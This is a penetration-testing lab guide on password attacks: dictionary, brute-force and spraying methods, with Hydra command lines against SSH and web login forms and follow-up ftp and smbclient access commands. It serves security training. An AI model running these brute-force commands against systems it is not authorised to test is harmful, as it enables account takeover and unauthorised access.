# Introduction

This practical lab focuses on password attacks and authentication testing.

During penetration tests, weak passwords are one of the most common ways attackers gain unauthorized access.

The objective of this lab is to practice identifying authentication services and performing controlled brute-force attacks against vulnerable targets.

You will practice:

- Service enumeration
- Username discovery
- Password attacks
- Hydra usage
- Web authentication testing
- Credential validation
- Post-exploitation enumeration

The methodology follows a professional penetration testing workflow.

---

# Lab Objectives

After completing this lab, you should be able to:

- Identify exposed authentication services
- Enumerate usernames
- Use password dictionaries
- Perform brute-force attacks
- Attack SSH authentication
- Attack FTP authentication
- Attack web login forms
- Validate discovered credentials
- Use credentials for further access

# Password Attacks

Password attacks attempt to discover valid credentials.

Common methods:

## Dictionary Attack

Uses a predefined password list.

Example:

```
username:

admin


password attempts:

password

admin123

qwerty

letmein
```

---

## Brute Force Attack

Tests all possible combinations.

Example:

```
aaa

aab

aac

aad
```

This method is slower but more complete.

---

## Password Spraying

Uses one common password against many users.

Example:

```
admin : Password123

john : Password123

mary : Password123
```

This avoids account lockouts.

---

# Hydra Brute Force Attacks

Hydra is one of the most common password attack tools.

Basic syntax:

```bash
hydra -l USER -P PASSWORD_LIST SERVICE://TARGET
```

Example:

```bash
hydra -l admin -P rockyou.txt ssh://TARGET
```

---

# SSH Brute Force

SSH example:

```bash
hydra \
-l admin \
-P /usr/share/wordlists/rockyou.txt \
ssh://TARGET
```

Successful result:

```
login: admin
password: password123
```

Test credentials:

```bash
ssh admin@TARGET
```

# Web Login Brute Force

Web applications commonly use login forms.

Example:

```
/login.php

/wp-login.php

/admin/
```

Hydra example:

```bash
hydra \
-l admin \
-P rockyou.txt \
TARGET \
http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid"
```

Important information:

- POST parameters
- Error messages
- Cookies
- CSRF tokens

Examples:

SSH:

```bash

```

FTP:

```bash
ftp TARGET
```

SMB:

```bash
smbclient -U user //TARGET/share
```

Web:

```
http://TARGET/login
```

Never assume credentials work without testing.

# Lessons Learned

This lab demonstrates how weak authentication can compromise systems.

Important lessons:

- Enumeration comes before attacks
- Valid usernames improve success rates
- Strong passwords prevent brute force
- Credential reuse increases risk
- Authentication services must be protected
